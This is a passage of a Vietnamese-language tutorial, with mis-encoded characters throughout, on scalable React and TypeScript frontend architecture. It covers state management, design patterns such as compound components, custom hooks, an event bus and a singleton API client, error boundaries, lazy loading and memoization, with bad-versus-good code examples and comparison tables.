// core/store/themeStore.ts
export const useThemeStore = create<ThemeState>((set) => ({
  theme: 'light',
  toggleTheme: () => set((state) => ({
    theme: state.theme === 'light' ? 'dark' : 'light'
  })),
}));

// 4ï¸âƒ£ SERVER STATE: Orders list
// features/orders/hooks/useOrders.ts
import { useQuery } from '@tanstack/react-query';
import { orderService } from '../services/orderService';

export const useOrders = () => {
  return useQuery({
    queryKey: ['orders'],
    queryFn: orderService.getOrders,
    staleTime: 5 * 60 * 1000,  // Cache 5 phÃºt
    cacheTime: 10 * 60 * 1000, // Giá»¯ cache 10 phÃºt
  });
};

/**
 * âœ… Lá»¢I ÃCH:
 * - Local state: ÄÆ¡n giáº£n, khÃ´ng cáº§n setup
 * - Shared state (Zustand): Nháº¹, dá»… dÃ¹ng hÆ¡n Redux
 * - Global state: Centralized, predictable
 * - Server state (React Query): Auto caching, revalidation, loading states
 */

---

### **ğŸ¨ PHáº¦N 3: DESIGN PATTERNS TRONG FRONTEND (CÃ¡c Máº«u Thiáº¿t Káº¿)**

```typescript
/**
 * ğŸ—ï¸ DESIGN PATTERNS (Máº«u Thiáº¿t Káº¿)
 * 
 * LÃ  cÃ¡c GIáº¢I PHÃP ÄÃƒ ÄÆ¯á»¢C CHá»¨NG MINH (proven solutions)
 * cho cÃ¡c Váº¤N Äá»€ THÆ¯á»œNG Gáº¶P trong láº­p trÃ¬nh.
 * 
 * ğŸ“‹ CÃC PATTERN THÆ¯á»œNG DÃ™NG TRONG REACT:
 * 1ï¸âƒ£ Container/Presentational Pattern
 * 2ï¸âƒ£ Compound Component Pattern
 * 3ï¸âƒ£ Render Props Pattern
 * 4ï¸âƒ£ Higher-Order Component (HOC) Pattern
 * 5ï¸âƒ£ Custom Hooks Pattern
 * 6ï¸âƒ£ Provider Pattern
 * 7ï¸âƒ£ Observer Pattern (Pub/Sub)
 * 8ï¸âƒ£ Factory Pattern
 * 9ï¸âƒ£ Singleton Pattern
 * ğŸ”Ÿ Module Pattern
 */

// ===================================================
// 1ï¸âƒ£ CONTAINER/PRESENTATIONAL PATTERN
// ===================================================

/**
 * ğŸ¯ Má»¤C ÄÃCH:
 * TÃ¡ch LOGIC (business logic) ra khá»i UI (presentation)
 * 
 * ğŸ“¦ CONTAINER (Smart Component):
 * - Xá»­ lÃ½ logic, fetch data, state management
 * - KHÃ”NG quan tÃ¢m UI
 * 
 * ğŸ¨ PRESENTATIONAL (Dumb Component):
 * - Chá»‰ nháº­n props vÃ  render UI
 * - KHÃ”NG cÃ³ logic, KHÃ”NG fetch data
 */

// âŒ BAD: Logic vÃ  UI láº«n lá»™n
const UserList = () => {
  const [users, setUsers] = useState([]);
  const [loading, setLoading] = useState(false);

  useEffect(() => {
    // Logic: Fetch data âŒ Láº«n vá»›i UI
    setLoading(true);
    fetch('/api/users')
      .then(res => res.json())
      .then(data => {
        setUsers(data);
        setLoading(false);
      });
  }, []);

  // UI: Render âŒ Láº«n vá»›i Logic
  if (loading) return <div>Loading...</div>;
  
  return (
    <ul>
      {users.map(user => (
        <li key={user.id}>
          {user.name} - {user.email}
        </li>
      ))}
    </ul>
  );
};

// âœ… GOOD: TÃ¡ch Container (Logic) vÃ  Presentational (UI)

// ğŸ“¦ CONTAINER (Logic)
const UserListContainer = () => {
  const { data: users, isLoading } = useQuery({
    queryKey: ['users'],
    queryFn: fetchUsers,
  });

  // âœ… Container KHÃ”NG RENDER UI, chá»‰ pass props
  return <UserListView users={users} loading={isLoading} />;
};

// ğŸ¨ PRESENTATIONAL (UI)
interface UserListViewProps {
  users: User[];
  loading: boolean;
}

const UserListView: React.FC<UserListViewProps> = ({ users, loading }) => {
  // âœ… Presentational chá»‰ render UI, KHÃ”NG cÃ³ logic
  if (loading) return <div>Loading...</div>;

  return (
    <ul>
      {users.map(user => (
        <li key={user.id}>
          {user.name} - {user.email}
        </li>
      ))}
    </ul>
  );
};

/**
 * âœ… Lá»¢I ÃCH:
 * - Dá»… test: Test logic riÃªng, test UI riÃªng
 * - Dá»… reuse: UserListView cÃ³ thá»ƒ dÃ¹ng vá»›i data khÃ¡c
 * - Dá»… Ä‘á»c: Logic á»Ÿ Container, UI á»Ÿ Presentational (rÃµ rÃ ng)
 */

// ===================================================
// 2ï¸âƒ£ COMPOUND COMPONENT PATTERN
// ===================================================

/**
 * ğŸ¯ Má»¤C ÄÃCH:
 * Táº¡o components LINH HOáº T báº±ng cÃ¡ch chia thÃ nh cÃ¡c SUB-COMPONENTS
 * cÃ³ thá»ƒ tÃ¹y chá»‰nh thá»© tá»±, layout.
 * 
 * VD: <Select>, <Tabs>, <Menu> - user tá»± quyáº¿t Ä‘á»‹nh thá»© tá»± cÃ¡c pháº§n
 */

// âŒ BAD: Component cá»©ng nháº¯c
interface TabsProps {
  tabs: Array<{ label: string; content: React.ReactNode }>;
}

const Tabs: React.FC<TabsProps> = ({ tabs }) => {
  const [activeTab, setActiveTab] = useState(0);

  return (
    <div>
      {/* âŒ Tab headers Cá» Äá»ŠNH á»Ÿ trÃªn */}
      <div className="tab-headers">
        {tabs.map((tab, index) => (
          <button key={index} onClick={() => setActiveTab(index)}>
            {tab.label}
          </button>
        ))}
      </div>

      {/* âŒ Tab content Cá» Äá»ŠNH á»Ÿ dÆ°á»›i */}
      <div className="tab-content">
        {tabs[activeTab].content}
      </div>
    </div>
  );
};

// Usage: âŒ KhÃ´ng thá»ƒ thay Ä‘á»•i layout
<Tabs tabs={[
  { label: 'Tab 1', content: <div>Content 1</div> },
  { label: 'Tab 2', content: <div>Content 2</div> },
]} />

// âœ… GOOD: Compound Components (Linh hoáº¡t)

// Context Ä‘á»ƒ share state giá»¯a sub-components
const TabsContext = createContext<{
  activeTab: number;
  setActiveTab: (index: number) => void;
} | null>(null);

// Main component
const Tabs: React.FC<{ children: React.ReactNode }> = ({ children }) => {
  const [activeTab, setActiveTab] = useState(0);

  return (
    <TabsContext.Provider value={{ activeTab, setActiveTab }}>
      <div className="tabs">{children}</div>
    </TabsContext.Provider>
  );
};

// Sub-component: TabList
Tabs.List = ({ children }: { children: React.ReactNode }) => {
  return <div className="tab-list">{children}</div>;
};

// Sub-component: Tab
Tabs.Tab = ({ index, children }: { index: number; children: React.ReactNode }) => {
  const context = useContext(TabsContext);
  if (!context) throw new Error('Tab must be used within Tabs');

  const isActive = context.activeTab === index;

  return (
    <button
      className={`tab ${isActive ? 'active' : ''}`}
      onClick={() => context.setActiveTab(index)}
    >
      {children}
    </button>
  );
};

// Sub-component: TabPanel
Tabs.Panel = ({ index, children }: { index: number; children: React.ReactNode }) => {
  const context = useContext(TabsContext);
  if (!context) throw new Error('TabPanel must be used within Tabs');

  if (context.activeTab !== index) return null;

  return <div className="tab-panel">{children}</div>;
};

// âœ… Usage: LINH HOáº T - user tá»± quyáº¿t Ä‘á»‹nh layout
<Tabs>
  {/* User tá»± quyáº¿t Ä‘á»‹nh: Tabs á»Ÿ trÃªn hay dÆ°á»›i */}
  <Tabs.List>
    <Tabs.Tab index={0}>Profile</Tabs.Tab>
    <Tabs.Tab index={1}>Settings</Tabs.Tab>
    <Tabs.Tab index={2}>Billing</Tabs.Tab>
  </Tabs.List>

  <Tabs.Panel index={0}>
    <ProfileContent />
  </Tabs.Panel>
  <Tabs.Panel index={1}>
    <SettingsContent />
  </Tabs.Panel>
  <Tabs.Panel index={2}>
    <BillingContent />
  </Tabs.Panel>
</Tabs>

// Hoáº·c: Tabs á»Ÿ dÆ°á»›i
<Tabs>
  <Tabs.Panel index={0}><ProfileContent /></Tabs.Panel>
  <Tabs.Panel index={1}><SettingsContent /></Tabs.Panel>
  
  <Tabs.List>
    <Tabs.Tab index={0}>Profile</Tabs.Tab>
    <Tabs.Tab index={1}>Settings</Tabs.Tab>
  </Tabs.List>
</Tabs>

/**
 * âœ… Lá»¢I ÃCH:
 * - Flexibility (Linh hoáº¡t): User tá»± quyáº¿t Ä‘á»‹nh layout
 * - Maintainability: Má»—i sub-component Ä‘á»™c láº­p
 * - API rÃµ rÃ ng: <Tabs.List>, <Tabs.Tab>, <Tabs.Panel>
 * 
 * ğŸ“š REAL EXAMPLES:
 * - Radix UI: <Tabs>, <Dialog>, <DropdownMenu>
 * - Headless UI: Táº¥t cáº£ components
 * - Chakra UI: <Menu>, <Accordion>
 */

// ===================================================
// 3ï¸âƒ£ CUSTOM HOOKS PATTERN
// ===================================================

/**
 * ğŸ¯ Má»¤C ÄÃCH:
 * TÃ¡i sá»­ dá»¥ng STATEFUL LOGIC (logic cÃ³ state) giá»¯a cÃ¡c components
 * 
 * ğŸ”¥ KHÃ”NG PHáº¢I tÃ¡i sá»­ dá»¥ng UI, mÃ  tÃ¡i sá»­ dá»¥ng LOGIC!
 */

// âŒ BAD: Copy-paste logic vÃ o má»—i component
const LoginForm = () => {
  const [value, setValue] = useState('');
  const [error, setError] = useState('');

  const validate = (val: string) => {
    if (!val) setError('Required');
    else if (!/\S+@\S+\.\S+/.test(val)) setError('Invalid email');
    else setError('');
  };

  const handleChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const val = e.target.value;
    setValue(val);
    validate(val);
  };

  return <input value={value} onChange={handleChange} />;
};

const RegisterForm = () => {
  // âŒ Copy-paste SAME LOGIC!
  const [value, setValue] = useState('');
  const [error, setError] = useState('');

  const validate = (val: string) => {
    if (!val) setError('Required');
    else if (!/\S+@\S+\.\S+/.test(val)) setError('Invalid email');
    else setError('');
  };

  const handleChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const val = e.target.value;
    setValue(val);
    validate(val);
  };

  return <input value={value} onChange={handleChange} />;
};

// âœ… GOOD: Extract logic vÃ o Custom Hook
const useFormField = (initialValue = '', validator?: (val: string) => string) => {
  const [value, setValue] = useState(initialValue);
  const [error, setError] = useState('');
  const [touched, setTouched] = useState(false);

  const validate = (val: string) => {
    if (validator) {
      const errorMsg = validator(val);
      setError(errorMsg);
    }
  };

  const handleChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const val = e.target.value;
    setValue(val);
    if (touched) validate(val);
  };

  const handleBlur = () => {
    setTouched(true);
    validate(value);
  };

  const reset = () => {
    setValue(initialValue);
    setError('');
    setTouched(false);
  };

  return {
    value,
    error,
    touched,
    handleChange,
    handleBlur,
    reset,
  };
};

// âœ… Usage: TÃ¡i sá»­ dá»¥ng logic
const LoginForm = () => {
  const email = useFormField('', (val) => {
    if (!val) return 'Required';
    if (!/\S+@\S+\.\S+/.test(val)) return 'Invalid email';
    return '';
  });

  const password = useFormField('', (val) => {
    if (!val) return 'Required';
    if (val.length < 8) return 'Min 8 characters';
    return '';
  });

  return (
    <form>
      <input {...email} />
      {email.touched && <span>{email.error}</span>}

      <input type="password" {...password} />
      {password.touched && <span>{password.error}</span>}
    </form>
  );
};

/**
 * âœ… Lá»¢I ÃCH:
 * - Reusability: DÃ¹ng láº¡i logic á»Ÿ nhiá»u components
 * - Testability: Test hook riÃªng (vá»›i @testing-library/react-hooks)
 * - Separation of Concerns: Logic tÃ¡ch khá»i UI
 * 
 * ğŸ“š POPULAR CUSTOM HOOKS:
 * - useDebounce: Delay input
 * - useLocalStorage: Sync state vá»›i localStorage
 * - useMediaQuery: Responsive breakpoints
 * - useFetch: Fetch data vá»›i loading/error states
 * - useIntersectionObserver: Lazy load images
 */

// ===================================================
// 4ï¸âƒ£ OBSERVER PATTERN (Pub/Sub)
// ===================================================

/**
 * ğŸ¯ Má»¤C ÄÃCH:
 * Nhiá»u components Láº®NG NGHE (subscribe) vÃ  PHáº¢N á»¨NG (react)
 * khi cÃ³ Sá»° KIá»†N (event) xáº£y ra.
 * 
 * ğŸ”¥ DÃ¹ng cho: Event Bus, Global notifications, Real-time updates
 */

// Implementation: Event Emitter
class EventEmitter {
  private events: Map<string, Array<(data: any) => void>> = new Map();

  // Subscribe to event (ÄÄƒng kÃ½ láº¯ng nghe)
  on(event: string, callback: (data: any) => void) {
    if (!this.events.has(event)) {
      this.events.set(event, []);
    }
    this.events.get(event)!.push(callback);

    // Return unsubscribe function
    return () => {
      const callbacks = this.events.get(event);
      if (callbacks) {
        const index = callbacks.indexOf(callback);
        if (index > -1) callbacks.splice(index, 1);
      }
    };
  }

  // Emit event (PhÃ¡t sá»± kiá»‡n)
  emit(event: string, data?: any) {
    const callbacks = this.events.get(event);
    if (callbacks) {
      callbacks.forEach(callback => callback(data));
    }
  }

  // Remove all listeners
  off(event: string) {
    this.events.delete(event);
  }
}

// Global event bus
export const eventBus = new EventEmitter();

// âœ… Usage Example: Real-time notifications

// Component 1: Emit event khi order completed
const OrderForm = () => {
  const handleSubmit = async () => {
    const order = await createOrder();
    
    // ğŸ“¢ Emit event: "order:completed"
    eventBus.emit('order:completed', {
      orderId: order.id,
      total: order.total,
    });
  };

  return <form onSubmit={handleSubmit}>...</form>;
};

// Component 2: Listen to event vÃ  show notification
const NotificationBar = () => {
  const [notifications, setNotifications] = useState<string[]>([]);

  useEffect(() => {
    // ğŸ‘‚ Subscribe to "order:completed"
    const unsubscribe = eventBus.on('order:completed', (data) => {
      setNotifications(prev => [
        ...prev,
        `Order #${data.orderId} completed! Total: $${data.total}`
      ]);
    });

    // Cleanup: Unsubscribe khi unmount
    return unsubscribe;
  }, []);

  return (
    <div className="notifications">
      {notifications.map((msg, i) => (
        <div key={i}>{msg}</div>
      ))}
    </div>
  );
};

// Component 3: Listen vÃ  update stats
const DashboardStats = () => {
  const [totalOrders, setTotalOrders] = useState(0);

  useEffect(() => {
    // ğŸ‘‚ Same event, different action
    const unsubscribe = eventBus.on('order:completed', () => {
      setTotalOrders(prev => prev + 1);
    });

    return unsubscribe;
  }, []);

  return <div>Total Orders: {totalOrders}</div>;
};

/**
 * âœ… Lá»¢I ÃCH:
 * - Loose Coupling: Components KHÃ”NG BIáº¾T nhau
 * - Scalability: ThÃªm listener má»›i dá»… dÃ ng
 * - Flexibility: 1 event â†’ nhiá»u reactions
 * 
 * âš ï¸ NHÆ¯á»¢C ÄIá»‚M:
 * - Hard to debug: KhÃ´ng biáº¿t ai emit, ai listen
 * - Memory leaks: QuÃªn unsubscribe
 * 
 * ğŸ’¡ KHI NÃ€O DÃ™NG:
 * - Real-time notifications
 * - Cross-feature communication
 * - Event tracking (analytics)
 */

// ===================================================
// 5ï¸âƒ£ SINGLETON PATTERN
// ===================================================

/**
 * ğŸ¯ Má»¤C ÄÃCH:
 * Äáº£m báº£o 1 class CHá»ˆ CÃ“ 1 INSTANCE duy nháº¥t trong toÃ n app.
 * 
 * ğŸ”¥ DÃ¹ng cho: API client, Logger, Config manager
 */

// âœ… Implementation: API Client Singleton
class ApiClient {
  private static instance: ApiClient;
  private baseURL: string;
  private token: string | null = null;

  // Private constructor (KhÃ´ng thá»ƒ new ApiClient())
  private constructor() {
    this.baseURL = import.meta.env.VITE_API_URL;
  }

  // Get singleton instance
  public static getInstance(): ApiClient {
    if (!ApiClient.instance) {
      ApiClient.instance = new ApiClient();
    }
    return ApiClient.instance;
  }

  // Set auth token
  public setToken(token: string) {
    this.token = token;
  }

  // API methods
  public async get<T>(endpoint: string): Promise<T> {
    const response = await fetch(`${this.baseURL}${endpoint}`, {
      headers: {
        'Authorization': `Bearer ${this.token}`,
      },
    });
    return response.json();
  }

  public async post<T>(endpoint: string, data: any): Promise<T> {
    const response = await fetch(`${this.baseURL}${endpoint}`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': `Bearer ${this.token}`,
      },
      body: JSON.stringify(data),
    });
    return response.json();
  }
}

// âœ… Usage: LuÃ´n cÃ¹ng 1 instance
const api = ApiClient.getInstance();

// Component 1: Set token
const LoginForm = () => {
  const handleLogin = async (credentials) => {
    const { token } = await api.post('/auth/login', credentials);
    
    // Set token vÃ o singleton instance
    api.setToken(token);
  };
};

// Component 2: Token Ä‘Ã£ cÃ³ sáºµn (cÃ¹ng instance)
const Dashboard = () => {
  const { data } = useQuery({
    queryKey: ['dashboard'],
    queryFn: () => api.get('/dashboard'),  // âœ… Token already set
  });
};

/**
 * âœ… Lá»¢I ÃCH:
 * - Shared state: Token Ä‘Æ°á»£c share giá»¯a táº¥t cáº£ API calls
 * - Memory efficient: Chá»‰ 1 instance
 * - Consistent config: Táº¥t cáº£ calls dÃ¹ng cÃ¹ng baseURL
 * 
 * âš ï¸ NHÆ¯á»¢C ÄIá»‚M:
 * - Hard to test: Singleton state persist giá»¯a tests
 * - Global state: CÃ³ thá»ƒ gÃ¢y side effects
 * 
 * ğŸ’¡ ALTERNATIVE: Dependency Injection
 *    â†’ Inject API client vÃ o components (testable hÆ¡n)
 */

---

### **ğŸš€ PHáº¦N 4: CODE ORGANIZATION & BEST PRACTICES (Tá»• Chá»©c Code & Thá»±c HÃ nh Tá»‘t)**

```typescript
/**
 * ğŸ“‹ BEST PRACTICES Äá»‚ CODE SCALE Tá»T:
 * 
 * 1ï¸âƒ£ SINGLE RESPONSIBILITY (TrÃ¡ch Nhiá»‡m ÄÆ¡n Nháº¥t)
 * 2ï¸âƒ£ DRY (Don't Repeat Yourself)
 * 3ï¸âƒ£ KISS (Keep It Simple, Stupid)
 * 4ï¸âƒ£ YAGNI (You Aren't Gonna Need It)
 * 5ï¸âƒ£ Dependency Injection
 * 6ï¸âƒ£ Error Boundaries
 * 7ï¸âƒ£ Code Splitting & Lazy Loading
 * 8ï¸âƒ£ Performance Optimization
 */

// ===================================================
// 1ï¸âƒ£ SINGLE RESPONSIBILITY PRINCIPLE
// ===================================================

// âŒ BAD: 1 component lÃ m QUÃ NHIá»€U viá»‡c
const UserDashboard = () => {
  const [user, setUser] = useState(null);
  const [orders, setOrders] = useState([]);
  const [products, setProducts] = useState([]);
  
  // Fetch user âŒ
  useEffect(() => {
    fetch('/api/user').then(res => res.json()).then(setUser);
  }, []);

  // Fetch orders âŒ
  useEffect(() => {
    fetch('/api/orders').then(res => res.json()).then(setOrders);
  }, []);

  // Fetch products âŒ
  useEffect(() => {
    fetch('/api/products').then(res => res.json()).then(setProducts);
  }, []);

  // Render user info âŒ
  // Render orders table âŒ
  // Render products grid âŒ
  // â†’ Component lÃ m QUÃ NHIá»€U viá»‡c!
};

// âœ… GOOD: Chia nhá» thÃ nh nhiá»u components, má»—i component 1 trÃ¡ch nhiá»‡m

// Component 1: Chá»‰ hiá»ƒn thá»‹ user info
const UserInfo: React.FC<{ user: User }> = ({ user }) => {
  return (
    <div>
      <h2>{user.name}</h2>
      <p>{user.email}</p>
    </div>
  );
};

// Component 2: Chá»‰ hiá»ƒn thá»‹ orders
const OrderList: React.FC<{ orders: Order[] }> = ({ orders }) => {
  return (
    <table>
      {orders.map(order => (
        <tr key={order.id}>
          <td>{order.id}</td>
          <td>${order.total}</td>
        </tr>
      ))}
    </table>
  );
};

// Component 3: Chá»‰ hiá»ƒn thá»‹ products
const ProductGrid: React.FC<{ products: Product[] }> = ({ products }) => {
  return (
    <div className="grid">
      {products.map(product => (
        <ProductCard key={product.id} product={product} />
      ))}
    </div>
  );
};

// Container: Chá»‰ fetch data vÃ  orchestrate (Ä‘iá»u phá»‘i)
const UserDashboard = () => {
  const { data: user } = useQuery({ queryKey: ['user'], queryFn: fetchUser });
  const { data: orders } = useQuery({ queryKey: ['orders'], queryFn: fetchOrders });
  const { data: products } = useQuery({ queryKey: ['products'], queryFn: fetchProducts });

  return (
    <div>
      <UserInfo user={user} />
      <OrderList orders={orders} />
      <ProductGrid products={products} />
    </div>
  );
};

// ===================================================
// 2ï¸âƒ£ ERROR BOUNDARIES
// ===================================================

/**
 * âš ï¸ Váº¤N Äá»€:
 * 1 component crash â†’ TOÃ€N Bá»˜ APP crash (blank screen)
 * 
 * âœ… GIáº¢I PHÃP:
 * Wrap components trong Error Boundary
 * â†’ Component crash â†’ hiá»‡n fallback UI (khÃ´ng crash app)
 */

class ErrorBoundary extends React.Component<
  { children: React.ReactNode; fallback: React.ReactNode },
  { hasError: boolean }
> {
  constructor(props) {
    super(props);
    this.state = { hasError: false };
  }

  static getDerivedStateFromError(error: Error) {
    return { hasError: true };
  }

  componentDidCatch(error: Error, errorInfo: React.ErrorInfo) {
    // Log error to service (Sentry, LogRocket...)
    console.error('Error caught by boundary:', error, errorInfo);
  }

  render() {
    if (this.state.hasError) {
      return this.props.fallback;
    }

    return this.props.children;
  }
}

// âœ… Usage: Wrap risky components
const App = () => {
  return (
    <div>
      {/* Dashboard crash â†’ chá»‰ hiá»‡n fallback, app váº«n hoáº¡t Ä‘á»™ng */}
      <ErrorBoundary fallback={<div>Dashboard failed to load</div>}>
        <Dashboard />
      </ErrorBoundary>

      {/* Orders crash â†’ chá»‰ Orders fail, Dashboard váº«n OK */}
      <ErrorBoundary fallback={<div>Orders failed to load</div>}>
        <Orders />
      </ErrorBoundary>
    </div>
  );
};

// ===================================================
// 3ï¸âƒ£ CODE SPLITTING & LAZY LOADING
// ===================================================

/**
 * ğŸ¯ Má»¤C ÄÃCH:
 * Chá»‰ load code KHI Cáº¦N (on-demand)
 * â†’ Initial bundle nhá» hÆ¡n â†’ Trang load nhanh hÆ¡n
 */

// âŒ BAD: Load táº¥t cáº£ routes ngay tá»« Ä‘áº§u
import Dashboard from './pages/Dashboard';  // 500 KB
import Orders from './pages/Orders';        // 300 KB
import Products from './pages/Products';    // 400 KB
import Settings from './pages/Settings';    // 200 KB

// Total bundle: 1.4 MB
// User vÃ o /dashboard â†’ pháº£i táº£i 1.4 MB (dÃ¹ chá»‰ cáº§n 500 KB) âŒ

// âœ… GOOD: Lazy load routes
const Dashboard = lazy(() => import('./pages/Dashboard'));
const Orders = lazy(() => import('./pages/Orders'));
const Products = lazy(() => import('./pages/Products'));
const Settings = lazy(() => import('./pages/Settings'));

const App = () => {
  return (
    <Suspense fallback={<div>Loading...</div>}>
      <Routes>
        <Route path="/dashboard" element={<Dashboard />} />
        <Route path="/orders" element={<Orders />} />
        <Route path="/products" element={<Products />} />
        <Route path="/settings" element={<Settings />} />
      </Routes>
    </Suspense>
  );
};

// âœ… Káº¿t quáº£:
// User vÃ o /dashboard:
//   - Initial load: vendor.js (300 KB) + main.js (50 KB) = 350 KB
//   - Dashboard chunk: 500 KB
//   - Total: 850 KB thay vÃ¬ 1.4 MB (39% nhá» hÆ¡n!)

// ===================================================
// 4ï¸âƒ£ PERFORMANCE OPTIMIZATION
// ===================================================

/**
 * ğŸš€ Ká»¸ THUáº¬T Tá»I Æ¯U PERFORMANCE:
 * 
 * 1. React.memo: TrÃ¡nh re-render khÃ´ng cáº§n thiáº¿t
 * 2. useMemo: Cache expensive calculations
 * 3. useCallback: Cache functions (trÃ¡nh re-create)
 * 4. Virtual Scrolling: Render chá»‰ items visible
 * 5. Debounce/Throttle: Giáº£m sá»‘ láº§n gá»i hÃ m
 */

// Example 1: React.memo
// âŒ BAD: Child re-render má»—i khi Parent re-render (dÃ¹ props khÃ´ng Ä‘á»•i)
const ExpensiveChild = ({ data }) => {
  console.log('ExpensiveChild rendered');  // Log má»—i láº§n render
  
  // Expensive calculation (tÃ­nh toÃ¡n náº·ng)
  const result = data.map(item => /* complex calculation */ item);
  
  return <div>{result}</div>;
};

const Parent = () => {
  const [count, setCount] = useState(0);  // State khÃ´ng liÃªn quan
  const data = [1, 2, 3];  // Data khÃ´ng Ä‘á»•i

  return (
    <div>
      <button onClick={() => setCount(count + 1)}>Count: {count}</button>
      <ExpensiveChild data={data} />
      {/* âŒ Click button â†’ count thay Ä‘á»•i â†’ Parent re-render
          â†’ ExpensiveChild re-render (dÃ¹ data khÃ´ng Ä‘á»•i!) */}
    </div>
  );
};

// âœ… GOOD: DÃ¹ng React.memo
const ExpensiveChild = React.memo(({ data }) => {
  console.log('ExpensiveChild rendered');
  const result = data.map(item => /* complex calculation */ item);
  return <div>{result}</div>;
});
// âœ… Child CHá»ˆ re-render khi props thay Ä‘á»•i

// Example 2: useMemo cho expensive calculations
const ProductList = ({ products, searchTerm }) => {
  // âŒ BAD: Filter má»—i láº§n render (dÃ¹ searchTerm khÃ´ng Ä‘á»•i)
  const filtered = products.filter(p => 
    p.name.toLowerCase().includes(searchTerm.toLowerCase())
  );

  // âœ… GOOD: Cache filtered result
  const filtered = useMemo(() => {
    return products.filter(p => 
      p.name.toLowerCase().includes(searchTerm.toLowerCase())
    );
  }, [products, searchTerm]);  // Chá»‰ re-calculate khi dependencies Ä‘á»•i

  return <div>{filtered.map(p => <ProductCard product={p} />)}</div>;
};

// Example 3: Virtual Scrolling vá»›i react-window
import { FixedSizeList } from 'react-window';

const VirtualizedList = ({ items }) => {
  // âœ… Chá»‰ render items VISIBLE (VD: 10 items)
  // KhÃ´ng render 10,000 items cÃ¹ng lÃºc âŒ
  
  const Row = ({ index, style }) => (
    <div style={style}>
      {items[index].name}
    </div>
  );

  return (
    <FixedSizeList
      height={600}        // Viewport height
      itemCount={items.length}  // 10,000 items
      itemSize={50}       // Má»—i item cao 50px
      width="100%"
    >
      {Row}
    </FixedSizeList>
  );
};

/**
 * ğŸ“Š PERFORMANCE COMPARISON:
 * 
 * âŒ WITHOUT Optimization (10,000 items):
 * - Initial render: 5 seconds
 * - Re-render on scroll: 500ms (lag!)
 * - Memory: 200 MB
 * 
 * âœ… WITH Virtual Scrolling:
 * - Initial render: 100ms (50x faster)
 * - Re-render on scroll: 16ms (smooth 60fps)
 * - Memory: 20 MB (10x less)
 */

---

### **ğŸ“Š PHáº¦N 5: SUMMARY & COMPARISON (TÃ³m Táº¯t & So SÃ¡nh)**

```typescript
/**
 * ğŸ¯ DESIGN SYSTEM - Táº I SAO Cáº¦N?
 * 
 * âœ… CONSISTENCY (Nháº¥t QuÃ¡n):
 *    â†’ Táº¥t cáº£ UI elements giá»‘ng nhau
 *    â†’ User khÃ´ng bá»‘i rá»‘i
 * 
 * âœ… SCALABILITY (Má»Ÿ Rá»™ng):
 *    â†’ 100 developers váº«n consistent
 *    â†’ ThÃªm 50 pages má»›i dá»… dÃ ng
 * 
 * âœ… SPEED (Tá»‘c Äá»™):
 *    â†’ Build page: 1 ngÃ y thay vÃ¬ 1 tuáº§n
 *    â†’ Copy tá»« Storybook â†’ paste
 * 
 * âœ… MAINTAINABILITY (Báº£o TrÃ¬):
 *    â†’ Äá»•i mÃ u: 1 file thay vÃ¬ 100 files
 *    â†’ Fix bug: 1 component thay vÃ¬ 50 chá»—
 */

/**
 * ğŸ—ï¸ SCALABLE FE ARCHITECTURE - 7 BÆ¯á»šC:
 * 
 * 1ï¸âƒ£ Layered Architecture: Presentation, Business Logic, Data Access, Infrastructure
 * 2ï¸âƒ£ Feature-based Folder Structure: NhÃ³m theo feature, khÃ´ng theo type
 * 3ï¸âƒ£ Design System: Tokens + Components + Guidelines + Docs
 * 4ï¸âƒ£ State Strategy: Local, Shared, Global, Server state (phÃ¢n loáº¡i rÃµ rÃ ng)
 * 5ï¸âƒ£ Code Organization: Single Responsibility, DRY, KISS
 * 6ï¸âƒ£ Tooling: Storybook, TypeScript, ESLint, Prettier
 * 7ï¸âƒ£ Testing: Unit, Integration, E2E + Documentation
 */

/**
 * ğŸ¨ DESIGN PATTERNS - KHI NÃ€O DÃ™NG?
 * 
 * 1ï¸âƒ£ Container/Presentational:
 *    â†’ TÃ¡ch logic ra khá»i UI
 *    â†’ DÃ¹ng: Háº§u háº¿t components
 * 
 * 2ï¸âƒ£ Compound Components:
 *    â†’ Components linh hoáº¡t, customizable layout
 *    â†’ DÃ¹ng: Tabs, Menu, Accordion, Dialog
 * 
 * 3ï¸âƒ£ Custom Hooks:
 *    â†’ TÃ¡i sá»­ dá»¥ng stateful logic
 *    â†’ DÃ¹ng: Form validation, Debounce, LocalStorage sync
 * 
 * 4ï¸âƒ£ Observer Pattern (Pub/Sub):
 *    â†’ Cross-component communication
 *    â†’ DÃ¹ng: Notifications, Real-time updates, Analytics
 * 
 * 5ï¸âƒ£ Singleton:
 *    â†’ 1 instance duy nháº¥t
 *    â†’ DÃ¹ng: API client, Logger, Config manager
 */
```

---

**ğŸ“Š COMPARISON TABLE (Báº£ng So SÃ¡nh)**

| Aspect | âŒ WITHOUT Design System | âœ… WITH Design System |
|--------|---------------------------|------------------------|
| **Consistency** | 10 loáº¡i Button khÃ¡c nhau | 1 Button, 3 variants |
| **Colors** | 50+ mÃ u hardcoded | 10 mÃ u trong tokens |
| **Maintenance** | Äá»•i mÃ u: 100 files, 3 ngÃ y | Äá»•i mÃ u: 1 file, 5 phÃºt |
| **Developer Speed** | Build page: 1 tuáº§n | Build page: 1 ngÃ y |
| **Onboarding** | 2-3 tuáº§n há»c codebase | 3-5 ngÃ y (cÃ³ Storybook) |
| **Design-Dev Sync** | "Button mÃ u gÃ¬?" (mÆ¡ há»“) | "Button variant='primary'" (rÃµ rÃ ng) |
| **Accessibility** | Developers quÃªn implement | Built-in (ARIA, keyboard nav) |

| Architecture | âŒ Type-based Structure | âœ… Feature-based Structure |
|--------------|-------------------------|----------------------------|
| **Folder Structure** | components/ (100 files) | features/auth/, features/orders/ |
| **Find Code** | TÃ¬m trong 3 folders | TÃ¬m trong 1 folder |
| **Team Autonomy** | Conflict nhiá»u | Ãt conflict (isolated) |
| **Code Splitting** | KhÃ³ | Dá»… (lazy load theo feature) |
| **Scalability** | KhÃ³ scale (100+ files/folder) | Dá»… scale (má»—i feature Ä‘á»™c láº­p) |

| Pattern | Use Case | âœ… Benefits | âš ï¸ Drawbacks |
|---------|----------|-------------|--------------|
| **Container/Presentational** | Háº§u háº¿t components | Dá»… test, reusable UI | ThÃªm boilerplate |
| **Compound Components** | Tabs, Menu, Accordion | Flexibility, API rÃµ rÃ ng | Phá»©c táº¡p hÆ¡n |
| **Custom Hooks** | Form, Debounce, Storage | Reusability, Testability | Cáº§n hiá»ƒu hooks tá»‘t |
| **Observer (Pub/Sub)** | Notifications, Events | Loose coupling | Hard to debug |
